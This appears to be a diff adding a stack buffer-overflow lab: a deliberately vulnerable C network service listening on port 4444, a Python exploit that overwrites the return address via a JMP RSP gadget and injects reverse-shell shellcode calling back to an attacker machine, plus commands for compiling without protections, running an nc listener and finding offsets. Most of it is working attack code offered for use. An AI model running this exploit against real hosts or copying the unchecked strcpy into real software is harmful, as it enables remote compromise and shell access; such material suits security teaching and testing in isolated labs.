@@ -1,0 +1,291 @@
+// vuln_service.c - Vulnerable service
+// Compile: gcc -fno-stack-protector -z execstack -no-pie -o vuln_service vuln_service.c
+// Run: ./vuln_service
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#define PORT 4444
+#define BUFFER_SIZE 64
+
+void handle_client(int client_fd) {
+    char buffer[BUFFER_SIZE];
+    int bytes_received;
+    
+    // Vulnerable – no bounds checking
+    bytes_received = recv(client_fd, buffer, 4096, 0);
+    if (bytes_received > 0) {
+        printf("[*] Received %d bytes\n", bytes_received);
+        // Trigger vuln: copy attacker-controlled data with unsafe strcpy
+        char vuln_buf[BUFFER_SIZE];
+        strcpy(vuln_buf, buffer);  // Buffer overflow here
+        printf("[*] Processed: %s\n", vuln_buf);
+    }
+    close(client_fd);
+}
+
+int main() {
+    int server_fd, client_fd;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t client_len = sizeof(client_addr);
+    
+    server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(PORT);
+    
+    bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    listen(server_fd, 5);
+    
+    printf("[*] Listening on port %d\n", PORT);
+    
+    while (1) {
+        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
+        printf("[*] Connection from %s\n", inet_ntoa(client_addr.sin_addr));
+        
+        if (fork() == 0) {
+            close(server_fd);
+            handle_client(client_fd);
+            exit(0);
+        }
+        close(client_fd);
+    }
+    return 0;
+}
+
+
+#!/usr/bin/env python3
+# exploit.py - Stack buffer overflow exploit
+# Target: vuln_service on 10.0.0.5:4444
+# Usage: python3 exploit.py
+
+import socket
+import struct
+import sys
+
+TARGET_IP = "10.0.0.5"
+TARGET_PORT = 4444
+
+# --- Configuration ---
+BUFFER_SIZE = 64          # Size of vuln_buf in the service
+SHELLCODE_PORT = 9999     # Port for reverse shell callback
+ATTACKER_IP = "10.0.0.1"  # Your attack machine IP
+
+# --- x86_64 Linux reverse shell shellcode (connect-back) ---
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9999 -f python -v shellcode
+shellcode = (
+    b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
+    b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc4"
+    b"\x48\x31\xc0\x50\x66\x44\x89\x44\x24\x02\x66\xc7\x44\x24\x02"
+    + struct.pack(">H", SHELLCODE_PORT) +
+    b"\xc6\x04\x24\x02\x48\x89\xe6\x6a\x10"
+    b"\x5a\x4c\x89\xe7\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e"
+    b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xc0\x50\x48"
+    b"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48"
+    b"\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
+)
+
+# --- Determine offsets ---
+# We need to find:
+# 1. Offset from buffer start to saved RBP
+# 2. Offset from buffer start to return address
+#
+# For a 64-byte buffer on the stack:
+# [vuln_buf 64 bytes][saved RBP 8 bytes][return address 8 bytes]
+# 
+# So offset to saved RBP = 64
+# Offset to return address = 64 + 8 = 72
+
+offset_to_rbp = BUFFER_SIZE       # 64
+offset_to_ret = BUFFER_SIZE + 8   # 72
+
+# --- Build ROP chain (if NX is enabled) ---
+# For a simple execstack binary, we jump directly to shellcode on the stack
+#
+# If ASLR is off and no PIE:
+# We need to find a 'jmp rsp' or 'call rsp' gadget, or leak a stack address
+#
+# For this exploit, we assume:
+# - No stack canary (-fno-stack-protector)
+# - Executable stack (-z execstack)  
+# - No PIE (-no-pie)
+#
+# The shellcode will be placed after the return address overwrite,
+# and we'll overwrite the return address with an address on the stack
+# pointing to our shellcode.
+
+# Strategy: Place shellcode after return address and jump to it
+# We'll use a JMP RSP gadget since RSP points right after the return address
+
+# JMP RSP gadget (common in libc or binary)
+# For a no-PIE binary, search: objdump -d vuln_service | grep -E "ff e4|jmp.*rsp"
+# Example JMP RSP bytes: \xff\xe4
+# Let's find it in the binary text section. If compiled with -no-pie,
+# the binary loads at 0x400000.
+
+# Search JMP RSP in the binary:
+# $ objdump -d vuln_service | grep -B1 "ff e4"
+#   401234: ff e4    jmp    *%rsp
+#
+# Or we can use a 'call rsp' gadget (ff d4)
+
+# For this exploit, we'll use a common approach:
+# Find JMP RSP in the binary or assume we can leak/bruteforce
+# Since we control the binary, let's find it:
+
+# --- Find JMP RSP in our binary ---
+import subprocess
+import re
+
+def find_jmp_rsp(binary_path="vuln_service"):
+    """Find JMP RSP gadget address in the binary"""
+    try:
+        output = subprocess.check_output(
+            ["objdump", "-d", binary_path],
+            stderr=subprocess.STDOUT
+        )
+        # Look for ff e4 (jmp rsp) or ff d4 (call rsp)
+        for line in output.decode().split('\n'):
+            if 'ff e4' in line:
+                addr = line.strip().split(':')[0].strip()
+                return int(addr, 16)
+            if 'ff d4' in line:
+                addr = line.strip().split(':')[0].strip()
+                return int(addr, 16)
+    except:
+        pass
+    
+    # Fallback: search in libc
+    try:
+        output = subprocess.check_output(
+            ["ldd", binary_path],
+            stderr=subprocess.STDOUT
+        ).decode()
+        for line in output.split('\n'):
+            if 'libc' in line:
+                libc_path = line.split('=>')[1].strip().split(' ')[0]
+                break
+        
+        # Use ROPgadget or manual search
+        output = subprocess.check_output(
+            ["ROPgadget", "--binary", libc_path, "--re", "jmp.*rsp"],
+            stderr=subprocess.STDOUT
+        ).decode()
+        # Parse the address
+        match = re.search(r'0x([0-9a-f]+)', output)
+        if match:
+            return int(match.group(1), 16)
+    except:
+        pass
+    
+    return None
+
+# --- Build payload ---
+def build_payload():
+    # Method 1: Jump to shellcode on stack (if we know stack address)
+    # Method 2: Use JMP RSP gadget (our shellcode sits right after return address)
+    
+    jmp_rsp_addr = find_jmp_rsp()
+    
+    if jmp_rsp_addr:
+        print(f"[*] Found JMP RSP gadget at: 0x{jmp_rsp_addr:016x}")
+        
+        # Build payload:
+        # [padding 64 bytes][saved RBP 8 bytes][JMP_RSP address 8 bytes][NOP sled][shellcode]
+        nop_sled = b"\x90" * 32  # NOP sled for alignment
+        
+        payload = b"A" * offset_to_rbp      # Fill buffer
+        payload += b"BBBBBBBB"               # Overwrite saved RBP (doesn't matter)
+        payload += struct.pack("<Q", jmp_rsp_addr)  # Overwrite return address with JMP RSP
+        
+        # After RET executes JMP RSP, RSP points here:
+        payload += nop_sled
+        payload += shellcode
+        
+        return payload
+    
+    else:
+        # Fallback: Try to spray the stack
+        # Without JMP RSP, we need to know stack address
+        # For demo purposes, we'll try a common stack address
+        # (This won't be reliable without ASLR disable or leak)
+        
+        print("[!] No JMP RSP gadget found, using hardcoded stack address (requires ASLR disabled)")
+        
+        # Common stack address (ASLR disabled): 0x7fffffffe000 range
+        # Adjust based on gdb analysis: info frame, x/100x $rsp
+        stack_addr = 0x7fffffffe200  # EXAMPLE - find via gdb
+        
+        payload = b"\x90" * 16               # NOP sled at start
+        payload += shellcode
+        payload += b"A" * (offset_to_ret - len(payload))  # Padding to return address
+        payload += struct.pack("<Q", stack_addr)  # Return to shellcode start
+        
+        return payload
+
+# --- Send exploit ---
+def exploit():
+    payload = build_payload()
+    
+    print(f"[*] Exploit payload size: {len(payload)} bytes")
+    print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}")
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    
+    try:
+        sock.connect((TARGET_IP, TARGET_PORT))
+        print("[*] Connected, sending payload...")
+        sock.send(payload)
+        print("[*] Payload sent!")
+        sock.close()
+        print("[*] Check your listener on port {}: nc -lvnp {}".format(
+            SHELLCODE_PORT, SHELLCODE_PORT))
+    except socket.timeout:
+        print("[!] Connection timed out")
+    except ConnectionRefusedError:
+        print("[!] Connection refused - is the service running?")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+if __name__ == "__main__":
+    # Setup listener first:
+    # nc -lvnp 9999
+    exploit()
+
+
+# On target (10.0.0.5):
+gcc -fno-stack-protector -z execstack -no-pie -m64 -o vuln_service vuln_service.c
+sudo ./vuln_service
+
+# On attack machine (10.0.0.1):
+nc -lvnp 9999
+python3 exploit.py
+
+
+# In the binary itself
+objdump -d vuln_service | grep -E "ff e4|jmp.*\*%rsp"
+
+# If not found, use ROPgadget on the binary or libc
+ROPgadget --binary vuln_service | grep ": jmp rsp"
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": jmp rsp"
+
+
+# Generate a pattern
+msf-pattern_create -l 200
+
+# Run the service in gdb on target
+gdb vuln_service
+run
+# Send the pattern from another terminal
+python3 -c "print('Aa0Aa1Aa2...')" | nc 10.0.0.5 4444
+
+# In gdb, find the offset:
+info registers
+x/s $rsp
+msf-pattern_offset -q <value_at_rsp>
